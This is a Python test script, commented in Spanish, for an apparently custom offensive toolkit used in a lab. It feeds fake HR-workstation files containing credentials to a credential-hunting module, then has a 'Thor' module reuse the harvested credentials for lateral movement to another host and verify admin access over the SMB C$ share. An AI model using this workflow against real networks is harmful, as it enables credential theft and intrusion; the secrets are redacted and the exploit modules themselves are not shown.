# tests/test_thor.py (mueve test_thor.py a la raíz del proyecto para probar -> python3 test_thor.py)

from modules import skadi
from modules import thor

# --- 1. Botin de PC_RRHH tal y como lo cazaria Skadi en local ---
FAKE_FS = {
    r"C:\Users\hrmanager\Desktop\passwords.txt":
        "Base de datos interna\nusername = sql_svc\npassword = <REDACTED>\n",
    r"C:\Users\hrmanager\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt":
        "dir\nAdministrator:<REDACTED>\ncls\n",
    r"C:\Users\hrmanager\Documents\IT_Support\remote_access.rdp":
        "full address:s:10.100.0.20\nusername:s:ithelp\nprompt for credentials:i:0\n",
    r"C:\Users\hrmanager\Documents\IT_Support\readme.txt":
        "Acceso remoto soporte IT\nusername: ithelp\npassword: <REDACTED>\n",
}

class FakeAccess:
    def list_files(self, directory, recurse=True):
        return [p for p in FAKE_FS if p.lower().startswith(directory.lower())]
    def file_size(self, path):
        return len(FAKE_FS.get(path, "").encode("utf-8"))
    def read_file(self, path):
        return FAKE_FS.get(path, "").encode("utf-8")

hunt = skadi.credential_hunt(FakeAccess())
credentials = hunt["candidates"]
print(f"[*] Skadi cazo {len(credentials)} candidata(s) en PC_RRHH")

# --- 2. Thor las prueba contra PC_IT real ---
PC_IT_IP = "10.100.0.20"   # <-- AJUSTAR a la IP real de PC_IT en el lab

print(f"[*] Thor intentando movimiento lateral hacia {PC_IT_IP} ...")
result = thor.lateral_move(credentials, PC_IT_IP)

if result["status"] == "success":
    print(f"[+] ACCESO a PC_IT: {result['username']}:{result['password']} "
          f"(al intento #{result['attempts']})")
    # Prueba de que el acceso vive y tiene C$ (requiere admin -> confirma que ithelp lo es):
    size = result["access"].file_size(r"C:\Windows\System32\drivers\etc\hosts")
    print(f"[+] Lectura por SMB OK -> hosts = {size} bytes")
    result["access"].close()
else:
    print(f"[-] Thor NO consiguio acceso tras {result['attempts']} intento(s)")